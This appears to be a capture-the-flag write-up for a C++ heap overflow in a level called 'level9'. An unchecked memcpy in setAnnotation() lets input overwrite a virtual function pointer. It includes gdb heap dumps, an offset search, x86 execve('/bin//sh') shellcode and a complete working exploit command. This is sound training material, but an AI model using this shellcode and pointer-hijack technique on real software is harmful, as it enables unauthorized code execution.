# Shell code in cpp

## Context: 

Main function create a class N *, and lets us write inside at N + 0x4.

Vuln is, funtion setAnnotation() use memcpy to write inside the class, lenght of argv[1], but size of class N is 108.

A the end of the program, main() call a pointer fucntion overwritable.

```c
  (**(code **)*this_00)(this_00,this);
```

if we print the Class inside the heap, we can see it is before another data : 0x08048848 which is a pointer to a N::funtion().

```c
(gdb) x/50xw 0x0804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x00004141
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
```

```c
0x08048848 -> 0x0804873a -> n::operator+()
```

## Exploit

First lets find the offset for overwrite data:

```c
$eax   : 0x62616163 ("caab"?)
gef➤  pattern offset 0x62616163
[+] Found at offset 108 (little-endian search) likely
```

### Payload :

#### What we need:

- padding : 108
- entry heap class: 0x804a008
- entry buffer: 0x804a00c
- shell address : 0x804a010
- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)

:warning: The payload begin with an address 4 byte further because, the pointer we overwrited was a **pointer, and he needed to point to another address, not on the shell code. So it point to the start of the buffer, which point to 4 bytes further.

Payload = shell address (entry buffer + 0x4) + shell code + padding - shell addres - shell code + entry buffer

./level9 $(python2.7 -c 'import sys; sys.stdout.write( b"\x10\xa0\x04\x08" + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" +  b"\x90" * 83 + b"\x0c\xa0\x04\x08")')
